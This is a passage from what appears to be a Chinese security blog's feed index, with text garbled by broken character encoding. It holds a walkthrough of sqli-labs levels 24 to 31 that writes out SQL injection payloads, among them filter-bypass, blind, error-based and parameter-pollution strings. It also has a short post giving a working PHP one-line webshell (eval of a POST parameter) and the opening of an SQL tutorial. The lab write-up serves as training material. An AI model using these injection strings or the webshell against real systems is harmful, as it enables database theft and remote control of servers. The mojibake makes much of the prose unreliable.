src="/2023/11/16/sqli-labs%E7%9A%84wp/less24-1.png" class="" title="Alt text"><br>è¿™æ˜¯ç™»é™†ç•Œé¢çš„ä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹è§ä¸€ä¸ªå«<code>mysql_real_escape_string()</code>è¿™ä¸ªå‡½æ•°æ˜¯å°†å­—ç¬¦ä¸²é‡Œçš„ç‰¹æ®Šå­—ç¬¦éƒ½ç»™è½¬æ„ï¼Œæˆ‘ä»¬å¯ä»¥å­˜å…¥ä¸€ä¸ªadminâ€™#,ä»–çš„â€™å’Œ#è½¬æ„æ€ä¸º\â€™#ä½¿å…¶æˆä¸ºæ­£å¸¸çš„å­—ç¬¦<br>è¿™ä¸ªæ˜¯æ³¨å†Œé¡µé¢çš„æºä»£ç ï¼Œè¿™ä¸ªä»£ç åŒæ ·ä¼šå°†å­—ç¬¦ä¸²è½¬æ„å¦‚ä½•åœ¨å­˜å…¥æ•°æ®åº“ï¼Œä½†æ˜¯åœ¨å­˜å…¥æ•°æ®åº“æ—¶ä¸ä¼šå°†è½¬æ„å­—ç¬¦\å­˜å…¥ï¼Œå¯¼è‡´å­˜å…¥çš„adminâ€™#<br><img src="/2023/11/16/sqli-labs%E7%9A%84wp/less24-2.png" class="" title="Alt text"><br>æˆ‘ä»¬åœ¨æŸ¥çœ‹ä¿®æ”¹å¯†ç çš„æºä»£ç <br><img src="/2023/11/16/sqli-labs%E7%9A%84wp/less24-3.png" class="" title="Alt text"><br>è¿™ä¸ªè¯­å¥ç›´æ¥ä»æ•°æ®åº“ä¸­è·å–ç”¨æˆ·åè€Œè¿™ä¸ªè·å–çš„è¿‡ç¨‹æ˜¯ä¸å­˜åœ¨è½¬ä¹‰æ‰€ä»¥ä»–çš„ä¿®æ”¹sqlè¯­å¥å°±ä¼šå˜ä¸º<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;admin&#x27;</span><br></pre></td></tr></table></figure><br>è¿™æ—¶æˆ‘ä»¬ä¿®æ”¹çš„å°±ä¸æ˜¯adminâ€™#çš„å¯†ç äº†è€Œæ˜¯adminçš„å¯†ç è€Œå†æˆ‘ä»¬ä¿®æ”¹å¥½ååˆ©ç”¨è¯¥è´¦å·å¯†ç è¿›è¡Œç™»å…¥å°±ä¼šæˆç™»å…¥æˆåŠŸ</p><h1 id="less25"><a href="#less25" class="headerlink" title="less25"></a>less25</h1><p>è¿™å…³æˆ‘ä»¬ç»è¿‡å°è¯•å¯ä»¥å‘ç°ç»•è¿‡äº†orå’Œandæˆ‘ä»¬æŸ¥çœ‹æºç <br><img src="/2023/11/16/sqli-labs%E7%9A%84wp/less25-2.png" class="" title="Alt text"><br><img src="/2023/11/16/sqli-labs%E7%9A%84wp/less25-1.png" class="" title="Alt text"><br>å‘ç°æ˜¯<code>preg_replace()</code>è¿™ä¸ªå‡½æ•°ä¼šåŒ¹é…å­—ç¬¦åå°†å­—ç¬¦è¿›è¡Œæ›¿æ¢ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™ä¸ªå‡½æ•°åŒ¹é…orå’Œandå°†å…¶æ›¿æ¢ä¸ºç©ºæ‰€ä»¥è¿™é“é¢˜ç›®è¿‡æ»¤äº†orå’Œand<br>ä¸€èˆ¬ç»•è¿‡orå’Œandè¿‡æ»¤æ–¹æ³•æœ‰ä»¥ä¸‹å‡ ç§<br>1ï¼Œå¯ä»¥ä½¿ç”¨å¤å†™å‘å°±æ˜¯å°†orå†™æˆoorrè¿™æ ·å½“orè¢«æ›¿æ¢ä¸ºç©ºæ—¶å°±ä¼šäº§ç”Ÿä¸€ä¸ªæ–°çš„orï¼Œandä¹ŸåŒç†<br>2ï¼Œç‰¹æ®Šå­—ç¬¦ç»•è¿‡æˆ‘ä»¬å¯ä»¥å°è¯•ç”¨ç‰¹æ®Šå­—ç¬¦||å’Œ&amp;&amp;æ¥ä»£æ›¿orå’Œand<br>3,è¿‡æ»¤ç¬¦ç»•è¿‡æˆ‘ä»¬å¯ä»¥å°è¯•æ„é€ è¿™æ ·çš„å¦‚o/**/ræˆ–/or/å°è¯•ç»•è¿‡<br>4,ç¼–ç ï¼Œhexï¼Œurlencode<br>5,å¤§å°å†™å˜å½¢ç»•è¿‡å¦‚Or,oR,OR<br>è¿™å…³æˆ‘ä»¬å¯ä»¥ä½¿ç”¨åŒå†™ç»•è¿‡å’Œç‰¹æ®Šå­—ç¬¦ç»•è¿‡ï¼Œ<br>æ³¨æ„åœ¨è¾“å…¥information_schemaæ—¶æˆ‘ä»¬è¦è¾“å…¥infoorrmation_schemaï¼Œå› ä¸ºinformationé‡Œæœ‰ä¸ªor</p><h1 id="less25a"><a href="#less25a" class="headerlink" title="less25a"></a>less25a</h1><p>è¿™å…³æˆ‘ä»¬è¾“å…¥?id=1å’Œid=2-1å›æ˜¾ç›¸åŒä¸ºæ•°å­—å‹ï¼Œä½†æ˜¯åœ¨ä¸ºä»€ä¹ˆè¾“å…¥å…¶ä»–è¯­å¥æ—¶å‘ç°å±å¹•åªæœ‰çœŸå‡å€¼çš„åŒºåˆ«æ‰€ä»¥è¿™å…³æˆ‘ä»¬é‡‡å–å¸ƒå°”ç›²æ³¨ï¼Œ<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 anandd ascii(substr((select database()),1,1))&gt;114</span><br></pre></td></tr></table></figure><br>ä¹Ÿå¯ä»¥ä½¿ç”¨oorræ¥è¿›è¡Œç›²æ³¨<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 oorr ascii(substr((select database()),1,1))=115</span><br></pre></td></tr></table></figure></p><h1 id="less26"><a href="#less26" class="headerlink" title="less26"></a>less26</h1><img src="/2023/11/16/sqli-labs%E7%9A%84wp/less26-1.png" class="" title="Alt text"><p>è¿™å…³æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç»•è¿‡äº†å¾ˆå¤šï¼Œå…¶ä¸­æ¯”è¾ƒé‡è¦çš„æœ‰and,or,ç©ºæ ¼å’Œæ³¨é‡Šç¬¦<br>ç©ºæ ¼æˆ‘ä»¬å¯ä»¥é‡‡ç”¨çš„ç»•è¿‡æ–¹å¼æœ‰ä»¥ä¸‹å‡ ç§<br>1,urlç¼–ç ï¼š%20ï¼Œ%0a,%a0,%0b,%0c,%0d<br>2ï¼Œ+,åŠ å·åœ¨è¿›è¡Œurldecodeæ—¶ä¼šè¢«è§£æä¸ºç©ºæ ¼<br>3ï¼Œæ³¨é‡Šç¬¦ç»•è¿‡ï¼š/<em>*/æˆ–/</em> */åœ¨ä¸€äº›æƒ…å†µä¸‹æ³¨é‡Šç¬¦ä¼šè¢«sqlè§£æå™¨è§£æä¸ºç©ºæ ¼<br>4,æ‹¬å·ç»•è¿‡ï¼Œå°†éœ€è¦ç”¨ç©ºæ ¼éš”å¼€çš„ä¸¤ä¸ªæŒ‡ä»¤ï¼Œä½¿ç”¨æ‹¬å·éš”å¼€å¯ä»¥è¿›è¡Œç»•è¿‡å¦‚select(database())</p><h2 id="å§¿åŠ¿ä¸€-æ‹¬å·ç»•è¿‡ç©ºæ ¼çš„æŠ¥é”™æ³¨å…¥"><a href="#å§¿åŠ¿ä¸€-æ‹¬å·ç»•è¿‡ç©ºæ ¼çš„æŠ¥é”™æ³¨å…¥" class="headerlink" title="å§¿åŠ¿ä¸€:æ‹¬å·ç»•è¿‡ç©ºæ ¼çš„æŠ¥é”™æ³¨å…¥"></a>å§¿åŠ¿ä¸€:æ‹¬å·ç»•è¿‡ç©ºæ ¼çš„æŠ¥é”™æ³¨å…¥</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;||extractvalue(1,concat(&#x27;~&#x27;,(select(group_concat(table_name))from(infoorrmation_schema.tables )where(table_schema)=database() )));%00</span><br></pre></td></tr></table></figure><h2 id="å§¿åŠ¿äºŒ-A0ç»•è¿‡ç©ºæ ¼è¿›è¡Œunionæ³¨å…¥"><a href="#å§¿åŠ¿äºŒ-A0ç»•è¿‡ç©ºæ ¼è¿›è¡Œunionæ³¨å…¥" class="headerlink" title="å§¿åŠ¿äºŒ:%A0ç»•è¿‡ç©ºæ ¼è¿›è¡Œunionæ³¨å…¥"></a>å§¿åŠ¿äºŒ:%A0ç»•è¿‡ç©ºæ ¼è¿›è¡Œunionæ³¨å…¥</h2><p>ç†è®ºä¸Šæ˜¯å¯ä»¥ä½¿ç”¨è¿™ä¸ªæ–¹æ³•è¿›è¡Œç»•è¿‡çš„ä½†æ˜¯å¾ˆå¯æƒœçš„æ˜¯å› ä¸ºæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯windowsç¯å¢ƒåœ¨æˆ‘ä»¬è¾“å…¥%A0æ—¶ä¼šå¯¼è‡´è§£æé”™è¯¯è§£ææˆï¿½ç”±äºç¯å¢ƒçš„åŸå› æ— æ³•åœ¨windowsæ­å»ºçš„é¶åœºä¸‹ä½¿ç”¨è¯¥æ–¹æ³•è¿›è¡Œç»•è¿‡ï¼Œä½†æ˜¯å¯ä»¥åœ¨linuxä¸‹è¿›è¡Œï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¸ç”¨æœ¬åœ°é¶åœºç”¨ç½‘ç»œä¸Šçš„sqlilabsé¶åœºè¿™æ ·å°±å¯ä»¥æˆåŠŸè¿›è¡Œäº†è¿™é‡Œæˆ‘ä½¿ç”¨çš„æ˜¯nssctfçš„é¶åœº</p><h2 id="å½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨ç›²æ³¨"><a href="#å½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨ç›²æ³¨" class="headerlink" title="å½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨ç›²æ³¨"></a>å½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨ç›²æ³¨</h2><h1 id="less26a"><a href="#less26a" class="headerlink" title="less26a"></a>less26a</h1><p>è¿™å…³æˆ‘ä»¬åœ¨æŸ¥çœ‹æºç åå¯ä»¥å‘ç°è¿‡æ»¤çš„å­—ç¬¦ä¸26å…³ä¸€æ¨¡ä¸€æ ·ä½†æ˜¯è¿™å…³åªå›æ˜¾æ­£ç¡®å’Œé”™è¯¯çš„ç•Œé¢æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¸ƒå°”ç›²æ³¨ï¼Œä»¥ä¸‹æ˜¯è¿™å…³å¯ä»¥ä½¿ç”¨çš„ä¸¤ç§ç»•è¿‡æ–¹æ³•</p><h2 id="ç»•è¿‡å§¿åŠ¿ä¸€ï¼šä½¿ç”¨ï¼ˆï¼‰ç»•è¿‡ç©ºæ ¼"><a href="#ç»•è¿‡å§¿åŠ¿ä¸€ï¼šä½¿ç”¨ï¼ˆï¼‰ç»•è¿‡ç©ºæ ¼" class="headerlink" title="ç»•è¿‡å§¿åŠ¿ä¸€ï¼šä½¿ç”¨ï¼ˆï¼‰ç»•è¿‡ç©ºæ ¼"></a>ç»•è¿‡å§¿åŠ¿ä¸€ï¼šä½¿ç”¨ï¼ˆï¼‰ç»•è¿‡ç©ºæ ¼</h2><p>ç”±äºæˆ‘ä»¬æ— æ³•ä½¿ç”¨ç©ºæ ¼æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç‰¹æ®Šå­—ç¬¦ç»•è¿‡andå’Œorä»¥æ­¤æ¥è§„é¿ç©ºæ ¼ï¼Œç»è¿‡æˆ‘çš„å°è¯•åªèƒ½ä½¿ç”¨orçš„ç‰¹æ®Šå­—ç¬¦||æ‰€ä»¥æˆ‘ä»¬éœ€è¦ä½¿ä¼ å…¥çš„<strong>idä¸ºç©º</strong>ä»¥æ­¤æ¥ä¿è¯å‰é¡¹ä¸ºé”™è¯¯<br>ä»£ç å¦‚ä¸‹<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27;)||ascii(substr((select(database()) ) ),1,1)&gt;100;%00</span><br></pre></td></tr></table></figure></p><h2 id="ç»•è¿‡å§¿åŠ¿äºŒï¼šä½¿ç”¨-A0ç»•è¿‡ç©ºæ ¼"><a href="#ç»•è¿‡å§¿åŠ¿äºŒï¼šä½¿ç”¨-A0ç»•è¿‡ç©ºæ ¼" class="headerlink" title="ç»•è¿‡å§¿åŠ¿äºŒï¼šä½¿ç”¨%A0ç»•è¿‡ç©ºæ ¼"></a>ç»•è¿‡å§¿åŠ¿äºŒï¼šä½¿ç”¨%A0ç»•è¿‡ç©ºæ ¼</h2><p>æˆ‘ä»¬å¯ä»¥å°è¯•ä½¿ç”¨%A0æ¥ç»•è¿‡ç©ºæ ¼ç„¶åé‡‡å–å¸ƒå°”ç›²æ³¨<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27;)||ascii(substr((select%A0database())),1,1)&gt;100;%00</span><br></pre></td></tr></table></figure></p><h1 id="less27"><a href="#less27" class="headerlink" title="less27"></a>less27</h1><p>è¿™å…³æˆ‘ä»¬ç›´æ¥æŸ¥çœ‹æºç <br><img src="/2023/11/16/sqli-labs%E7%9A%84wp/less27-1.png" class="" title="Alt text"><br>ä»ç„¶ä½¿å› ä¸ºpreg_replaceå°†å­—ç¬¦è¿›è¡Œäº†æ›¿æ¢ï¼Œ/sè¡¨ç¤ºåŒ¹é…ä»»æ„å­—ç¬¦åŒ…æ‹¬æ¢è¡Œç¬¦ï¼Œ/mè¡¨ç¤ºå¯ä»¥å¤šè¡ŒåŒ¹é…æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿‡æ»¤äº†å¾ˆå¤šç©ºæ ¼ï¼Œæ³¨é‡Šï¼Œunionå’Œselectï¼Œè¿˜æœ‰åŠ å·ï¼Œç­‰</p><h2 id="selectå’Œunionçš„ä¸€èˆ¬ç»•è¿‡æ–¹æ³•"><a href="#selectå’Œunionçš„ä¸€èˆ¬ç»•è¿‡æ–¹æ³•" class="headerlink" title="selectå’Œunionçš„ä¸€èˆ¬ç»•è¿‡æ–¹æ³•"></a>selectå’Œunionçš„ä¸€èˆ¬ç»•è¿‡æ–¹æ³•</h2><p>1:å¤§å°å†™ç»•è¿‡ï¼Œå¯ä»¥å°†é‡Œçš„ä¸€äº›å­—ç¬¦ä»å°å†™æ”¹ä¸ºå¤§å†™ï¼Œè¿™æ ·å­å¯ä»¥ç»•è¿‡ä¸€äº›æ¯”è¾ƒç®€å•çš„é¢˜ç›®<br>2:åŒå†™ç»•è¿‡å¯ä»¥åŒå†™selectå¦‚sleselectctè¿™æ ·å­å°±ä¼šå¯¼è‡´selectè¢«åˆ é™¤åè¿˜å¯ä»¥å†æ¬¡å‡ºç°ä¸€ä¸ªæ–°çš„select<br>3:æ³¨é‡Šç¬¦ç»•è¿‡ï¼Œå¦‚sel/**/ectä¸€äº›æ²¡æœ‰è¿‡æ»¤æ³¨é‡Šç¬¦çš„é¢˜ç›®ä¼šå°†æ³¨é‡Šç¬¦å½“æˆç©ºå€¼ï¼Œä¹‹åå°±ä¼šå˜æˆselect<br>è¿™é“é¢˜ç›®çš„ç»•è¿‡æ–¹æ³•å¾ˆå¤š<br>åœ¨ç»è¿‡å°è¯•ä¹‹åå‘ç°ç©ºæ ¼å¯ä»¥é‡‡ç”¨%0A,%0B,%0C,%0Dè¿›è¡Œç»•è¿‡</p><h2 id="å§¿åŠ¿ä¸€-ä½¿ç”¨å¤§å°å†™ç»•è¿‡union"><a href="#å§¿åŠ¿ä¸€-ä½¿ç”¨å¤§å°å†™ç»•è¿‡union" class="headerlink" title="å§¿åŠ¿ä¸€:ä½¿ç”¨å¤§å°å†™ç»•è¿‡union"></a>å§¿åŠ¿ä¸€:ä½¿ç”¨å¤§å°å†™ç»•è¿‡union</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;%0AunIon%0AseLEct%0A1,2,group_concat(table_name)%0Afrom%0Ainformation_schema.tables%0Awhere%0Atable_schema=database();%00</span><br></pre></td></tr></table></figure><h2 id="å§¿åŠ¿äºŒ-ä½¿ç”¨åŒå†™æ¥ç»•è¿‡union"><a href="#å§¿åŠ¿äºŒ-ä½¿ç”¨åŒå†™æ¥ç»•è¿‡union" class="headerlink" title="å§¿åŠ¿äºŒ:ä½¿ç”¨åŒå†™æ¥ç»•è¿‡union"></a>å§¿åŠ¿äºŒ:ä½¿ç”¨åŒå†™æ¥ç»•è¿‡union</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;%0Auniunionon%0Aseleselectct%0A1,2,group_concat(table_name)%0Afrom%0Ainformation_schema.tables%0Awhere%0Atable_schema=database();%00</span><br></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œæˆ‘ä»‹ç»ä¸¤ä¸ªå§¿åŠ¿å…¶ä»–å§¿åŠ¿æˆ‘å°±ä¸è¿‡å¤šèµ˜è¿°äº†</p><h1 id="less-27a"><a href="#less-27a" class="headerlink" title="less 27a"></a>less 27a</h1><p>è¿™å…³ä¸27å‡ ä¹ç›¸åŒåªæ˜¯å›æ˜¾åªæœ‰æ­£ç¡®å’Œé”™è¯¯ä¸¤å€¼æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é‡‡ç”¨å¸ƒå°”ç›²æ³¨ï¼Œä»£ç å¦‚ä¸‹<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;%0aand%0aascii(substr((select%0adatabase()),1,1))&gt;100;%00</span><br></pre></td></tr></table></figure></p><h1 id="less-28"><a href="#less-28" class="headerlink" title="less 28"></a>less 28</h1><p>åœ¨æ‰“è¿™å…³çš„æ—¶å€™æˆ‘æµ…æµ…çš„å°è¯•äº†ä¸€ä¸‹å‘ç°å…¶è¿‡æ»¤çš„å­—ç¬¦å¥½åƒå¾ˆå°‘ï¼Œæ‰€ä»¥æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹æºç <br><img src="/2023/11/16/sqli-labs%E7%9A%84wp/less28-1.png" class="" title="Alt text"><br>æˆ‘ä»¬æŸ¥çœ‹è¿™ä¸ªï¼Œå‘ç°å°±è¿‡æ»¤äº†æ³¨é‡Šç¬¦ï¼Œç©ºæ ¼ï¼ŒåŠ å·ï¼Œè¿˜æœ‰<code>union select</code><br>æˆ‘ä»¬çœ‹è¿™ä¸ªè¯­å¥<code>$id= preg_replace(&#39;/union\s+select/i&#39;,&quot;&quot;, $id);</code>è¿™ä¸ªè¯­å¥ä¸­æ˜¯é‡åˆ°<code>union select</code>æ‰ä¼šåˆ é™¤å•ç‹¬é‡è§unionæˆ–selectä¸ä¼šåˆ é™¤ï¼Œå…¶ä¸­<code>\s+</code>æ˜¯åŒ¹é…ä¸€ä¸ªç©ºæ ¼æˆ–å¤šä¸ªç©ºæ ¼ã€‚ç„¶è€Œè¿™ä¸ªæ— æ³•ä½¿ç”¨è”åˆæ³¨å…¥åªèƒ½ä½¿ç”¨ç›²æ³¨æ‰€ä»¥è¿™é¢˜è¿‡æ»¤è¯­å¥å¯ä»¥å¿½ç•¥<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;%0aand%0aascii(substr((select%0adatabase()),1,1))&gt;100;%00</span><br></pre></td></tr></table></figure></p><h1 id="less29"><a href="#less29" class="headerlink" title="less29"></a>less29</h1><p>è¿™å…³æˆ‘åœ¨åšçš„æ—¶å€™ç›´æ¥ä½¿ç”¨unionæ³¨å…¥å°±å¯ä»¥æˆåŠŸæ²¡æœ‰ä»»ä½•è¿‡æ»¤æˆ‘æ„Ÿåˆ°å¾ˆå¥‡æ€ªæ‰€ä»¥å¤–æŸ¥äº†ç½‘ç»œä¸Šçš„wpæˆ‘å‘ç°è¿™é“é¢˜ç›®ä¸»è¦æ˜¯è®©æˆ‘ä»¬äº†è§£<code>åŒå±‚æœåŠ¡å™¨</code>çš„æ¦‚å¿µï¼Œä½†æ˜¯å¯èƒ½æ˜¯å› ä¸ºç¯å¢ƒç­‰åŸå› å¯¼è‡´æˆ‘ä»¬æ— æ³•æˆåŠŸè·³è½¬æœåŠ¡å™¨ã€‚å¯èƒ½æ˜¯å› ä¸ºç¯å¢ƒçš„åŸå› æˆ‘æ— æ³•è¾¾æˆç½‘ä¸Šçš„æ•ˆæœä½†æ˜¯å¯ä»¥ç›´æ¥æ‰‹åŠ¨è¿è¡Œï¼Œlogin.phpæ–‡ä»¶åœ¨è¿›è¡Œæ³¨å…¥ï¼Œ<br>æˆ‘ä»¬å†™ä¸‹?id=1â€™å¯ä»¥å‘ç°ç›´æ¥è¿›è¡Œäº†è·³è½¬ï¼Œè·³è½¬åˆ°äº†hacked.phpï¼Œæˆ‘ä»¬ç›´æ¥æŸ¥çœ‹æºç <br><img src="/2023/11/16/sqli-labs%E7%9A%84wp/less29-1.png" class="" title="Alt text"><br>é¦–å…ˆ$_server[â€˜QUERY_STRINGâ€™]æ˜¯è·å–å­—ç¬¦çš„è¯­å¥ï¼Œå°†è·å–çš„å­—ç¬¦ä¸²ä¼ java_implimentationï¼ˆï¼‰é‡Œã€‚<br><img src="/2023/11/16/sqli-labs%E7%9A%84wp/less29-3.png" class="" title="Alt text"></p><p>explode(â€œ&amp;â€,$q_s)çš„åŠŸèƒ½æ˜¯åˆ†æ ¼å­—ç¬¦,ä»¥&amp;ä¸ºåˆ†ç•Œçº¿åˆ†å‰²å­—ç¬¦ï¼Œ<br>foreachçš„ä½œç”¨æ˜¯éå†æ•°ç»„ï¼Œforeach($qs_array as $key=&gt;$value)çš„æ„æ€æ˜¯éå†æ•°ç»„å¹¶å°†æ¯ä¸€ä¸ªå­—ç¬¦èµ‹å€¼åˆ°valueé‡Œï¼Œå°†valèµ‹å€¼ä¸ºvalueçš„å‰ä¸‰ä½ï¼Œå¦‚ä¸ºidå°±å°†valueçš„ç¬¬å››ä½åˆ°30è¿”å›å¹¶ä¼ åˆ°whitelisté‡Œ<br><img src="/2023/11/16/sqli-labs%E7%9A%84wp/less29-2.png" class="" title="Alt text"><br>è¿™ä¸ªæ–¹æ³•æ˜¯ä¸€ä¸ªæ­£åˆ™è¿‡æ»¤ï¼Œæ„æ€æ˜¯åªèƒ½åŒ¹é…æ•°å­—ï¼Œå¦‚æœä¸æ˜¯æ•°å­—å°±ä¼šè·³è½¬åˆ°hacked.phpå¯ä»¥çœ‹åˆ°è¿™æ˜¯ä¸€ä¸ªå¾ˆå¼ºçš„wafã€‚<br><img src="/2023/11/16/sqli-labs%E7%9A%84wp/less29-2.jpg" class="" title="Alt text"><br>è¿™æ—¶å€™æˆ‘ä»¬å°±éœ€è¦çŸ¥é“åŒæœåŠ¡å™¨çš„æ¦‚å¿µäº†ã€‚åŒæœåŠ¡å™¨å°±æ˜¯ä¸€ä¸ªæœåŠ¡å™¨æœ‰ä¸¤ä¸ªæœåŠ¡ç«¯ç›–ï¼ŒæœåŠ¡å™¨ç«¯æœ‰ä¸¤ä¸ªéƒ¨åˆ†ï¼šç¬¬ä¸€éƒ¨åˆ†ä¸ºtomcatä¸ºå¼•æ“çš„jspå‹æœåŠ¡å™¨ï¼Œç¬¬äºŒéƒ¨åˆ†ä¸ºapacheä¸ºå¼•æ“çš„phpæœåŠ¡å™¨ï¼ŒçœŸæ­£æä¾›webæœåŠ¡çš„æ˜¯phpæœåŠ¡å™¨ã€‚<br>å·¥ä½œæµç¨‹ä¸ºï¼šclientè®¿é—®æœåŠ¡å™¨ï¼Œèƒ½ç›´æ¥è®¿é—®åˆ°tomcatæœåŠ¡å™¨ï¼Œç„¶åtomcatæœåŠ¡å™¨å†å‘apacheæœåŠ¡å™¨è¯·æ±‚æ•°æ®ã€‚æ•°æ®è¿”å›è·¯å¾„åˆ™ç›¸åã€‚å®¢æˆ·ç«¯è¯·æ±‚é¦–å…ˆè¿‡tomcatï¼Œtomcatè§£æç¬¬ä¸€ä¸ªå‚æ•°ï¼Œæ¥ä¸‹æ¥tomcatå»è¯·æ±‚apacheï¼ˆphpï¼‰æœåŠ¡å™¨ï¼Œapacheè§£ææœ€åä¸€ä¸ªå‚æ•°ã€‚<br>é€šè¿‡å·¥ä½œæµç¨‹æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œtomcatåªä¼šè§£æç¬¬ä¸€ä¸ªä¼ è¾“çš„å‚æ•°ï¼Œè€ŒapacheæœåŠ¡å™¨ä¼šè§£ææœ€åä¸€ä¸ªå‚æ•°ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åœ¨ç¬¬ä¸€ä¸ªå‚æ•°è¾“å…¥ç¬¦åˆtomcatçš„å‚æ•°ï¼Œå†åœ¨ç¬¬äºŒä¸ªå‚æ•°å†™å…¥æ³¨å…¥è¯­å¥æ¥ç»•è¿‡tomcatæœåŠ¡å™¨<br><figure class="highlight sql"><figcaption><span>æ³¨å…¥è¯­å¥</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,2,database()--+</span></span><br></pre></td></tr></table></figure></p><h1 id="less30å’Œ31"><a href="#less30å’Œ31" class="headerlink" title="less30å’Œ31"></a>less30å’Œ31</h1><p>å’Œ29ç±»ä¼¼åªæ˜¯é—­åˆæ–¹å¼ä¸åŒ<br>30é—­åˆæ–¹å¼ä½â€,32æ˜¯â€)<br>2</p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
          <category> é¶åœº </category>
          
          <category> sql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> top10 </tag>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸€å¥è¯æœ¨é©¬</title>
      <link href="/2023/11/14/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/"/>
      <url>/2023/11/14/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<h1 id="è¿™ç¯‡æ–‡ç« æ˜¯å…³äºä¸€å¥è¯æœ¨é©¬çš„æ–‡ç« "><a href="#è¿™ç¯‡æ–‡ç« æ˜¯å…³äºä¸€å¥è¯æœ¨é©¬çš„æ–‡ç« " class="headerlink" title="è¿™ç¯‡æ–‡ç« æ˜¯å…³äºä¸€å¥è¯æœ¨é©¬çš„æ–‡ç« "></a>è¿™ç¯‡æ–‡ç« æ˜¯å…³äºä¸€å¥è¯æœ¨é©¬çš„æ–‡ç« </h1><p>ä¸€å¥è¯æœ¨é©¬å¯ä»¥è¯´æ˜¯æœ€ç®€å•å—æœ¨é©¬äº†ï¼Œä»£ç å¦‚ä¸‹<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;1&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
          <category> webshell </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æœ¨é©¬ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlæ³¨å…¥çš„å­¦ä¹ </title>
      <link href="/2023/11/09/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/11/09/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="æˆ‘ä¼šåœ¨è¿™é‡Œå†™ä¸‹sqlæ³¨å…¥çš„ä¸€äº›å­¦ä¹ è¿‡ç¨‹"><a href="#æˆ‘ä¼šåœ¨è¿™é‡Œå†™ä¸‹sqlæ³¨å…¥çš„ä¸€äº›å­¦ä¹ è¿‡ç¨‹" class="headerlink" title="æˆ‘ä¼šåœ¨è¿™é‡Œå†™ä¸‹sqlæ³¨å…¥çš„ä¸€äº›å­¦ä¹ è¿‡ç¨‹"></a>æˆ‘ä¼šåœ¨è¿™é‡Œå†™ä¸‹sqlæ³¨å…¥çš„ä¸€äº›å­¦ä¹ è¿‡ç¨‹</h1><h2 id="sqlçš„å¢åˆ æ”¹"><a href="#sqlçš„å¢åˆ æ”¹" class="headerlink" title="sqlçš„å¢åˆ æ”¹"></a>sqlçš„å¢åˆ æ”¹</h2><h3 id="æŸ¥çœ‹æ•°æ®åº“"><a href="#æŸ¥çœ‹æ•°æ®åº“" class="headerlink" title="æŸ¥çœ‹æ•°æ®åº“"></a>æŸ¥çœ‹æ•°æ®åº“</h3><p><code>show databases</code></p><h3 id="åˆ›å»ºä¸åˆ é™¤æ•°æ®åº“"><a href="#åˆ›å»ºä¸åˆ é™¤æ•°æ®åº“" class="headerlink" title="åˆ›å»ºä¸åˆ é™¤æ•°æ®åº“"></a>åˆ›å»ºä¸åˆ é™¤æ•°æ®åº“</h3><p><code>create database employees charset 